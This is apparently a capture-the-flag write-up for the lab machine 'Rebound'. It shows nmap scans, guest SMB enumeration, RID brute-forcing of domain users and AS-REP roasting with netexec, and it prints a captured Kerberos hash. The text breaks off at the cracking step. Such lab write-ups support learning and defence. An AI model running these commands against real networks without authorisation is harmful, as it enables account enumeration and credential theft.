# Host file setup
```python
sudo nxc smb 10.129.14.17 --generate-hosts-file /etc/hosts                                     
[sudo] password for kali: 
SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```
Few things note:
- Null auth is true
- SMB signing is enabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.rebound.htb                                                        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 14:53 +0100
Nmap scan report for dc01.rebound.htb (10.129.14.17)
Host is up (0.015s latency).
rDNS record for 10.129.14.17: DC01.rebound.htb
Not shown: 65509 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49696/tcp open  unknown
49709/tcp open  unknown
49724/tcp open  unknown
49743/tcp open  unknown
59390/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
```
## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT dc01.rebound.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 14:55 +0100
Nmap scan report for dc01.rebound.htb (10.129.14.17)
Host is up (0.015s latency).
rDNS record for 10.129.14.17: DC01.rebound.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-04 20:55:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-04T20:56:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-04T20:56:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-04T20:56:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-04T20:56:09+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|2012|2022|2016 (96%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows Server 2019 (95%), Windows Server 2019 (92%), Microsoft Windows 10 1709 - 21H2 (91%), Microsoft Windows 10 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2022 (91%), Microsoft Windows 10 20H2 (90%), Microsoft Windows 10 20H2 - 21H1 (90%), Microsoft Windows 10 1903 - 21H1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Nmap tell me the DC is running at +7h

# SMB (445)
Null auth is enabled but not able to use it to access shares or list users
## Guest access
The guest account is enabled

### Shares
```python
nxc smb dc01.rebound.htb -u 'Guest' -p '' --shares
SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.17    445    DC01             [+] rebound.htb\Guest: 
SMB         10.129.14.17    445    DC01             [*] Enumerated shares
SMB         10.129.14.17    445    DC01             Share           Permissions     Remark
SMB         10.129.14.17    445    DC01             -----           -----------     ------
SMB         10.129.14.17    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.14.17    445    DC01             C$                              Default share
SMB         10.129.14.17    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.14.17    445    DC01             NETLOGON                        Logon server share 
SMB         10.129.14.17    445    DC01             Shared          READ            
SMB         10.129.14.17    445    DC01             SYSVOL                          Logon server share
```
### Users
```python
nxc smb dc01.rebound.htb -u 'Guest' -p '' --rid-brute 20000
SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.17    445    DC01             [+] rebound.htb\Guest: 
SMB         10.129.14.17    445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.129.14.17    445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.129.14.17    445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.129.14.17    445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         10.129.14.17    445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         10.129.14.17    445    DC01             515: rebound\Domain Computers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
SMB         10.129.14.17    445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.14.17    445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.14.17    445    DC01             525: rebound\Protected Users (SidTypeGroup)
SMB         10.129.14.17    445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.14.17    445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.14.17    445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.14.17    445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.14.17    445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         10.129.14.17    445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         10.129.14.17    445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.14.17    445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         10.129.14.17    445    DC01             2952: rebound\llune (SidTypeUser)
SMB         10.129.14.17    445    DC01             3382: rebound\fflock (SidTypeUser)
SMB         10.129.14.17    445    DC01             5277: rebound\jjones (SidTypeUser)
SMB         10.129.14.17    445    DC01             5569: rebound\mmalone (SidTypeUser)
SMB         10.129.14.17    445    DC01             5680: rebound\nnoon (SidTypeUser)
SMB         10.129.14.17    445    DC01             7681: rebound\ldap_monitor (SidTypeUser)
SMB         10.129.14.17    445    DC01             7682: rebound\oorend (SidTypeUser)
SMB         10.129.14.17    445    DC01             7683: rebound\ServiceMgmt (SidTypeGroup)
SMB         10.129.14.17    445    DC01             7684: rebound\winrm_svc (SidTypeUser)
SMB         10.129.14.17    445    DC01             7685: rebound\batch_runner (SidTypeUser)
SMB         10.129.14.17    445    DC01             7686: rebound\tbrady (SidTypeUser)
SMB         10.129.14.17    445    DC01             7687: rebound\delegator$ (SidTypeUser
```
Found all the users, from here i can use this to generate a user list

With the users file i can perform something like AS-REP roasting

# AS-REP roasting
```python
nxc ldap dc01.rebound.htb -u users.txt -p '' --asreproast asrep.hash
LDAP        10.129.14.17    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.129.14.17    389    DC01             $krb5asrep$23$jjones@REBOUND.HTB:0551ef0d6dbd461030bc230450267059$004a8353e9f2bcec2d8e66a34ade019a4660c9aaea16c75d70b90d4f3fe9793157b3b5ad344c34d0a1be85ad13414bd828f153567f82bde50da10b4904c51b9e8f32f2231174db41856fac773cc151f74c2c8b293ecc005ad2672938c413acf640b55f978dc1b5138f97aeec08fa9f60c30e6a03d93bcdc253f7254cbc0e0bbc75bb79ef3819c6b8d38608b09cf1d9b95ae69fba2351a309b1911f080fbeda95370e37382391313c7659c29a6309a70c888fc915413a5f7a7704b873b5930d5b8cfa3ac2358b7465ed400bfd7104ab66f203b86a72e6a8d5e6cb1ef4d9519b7b589f686ff1c2f9e603c2
```
I have found a hash!

## Cracking the hash
T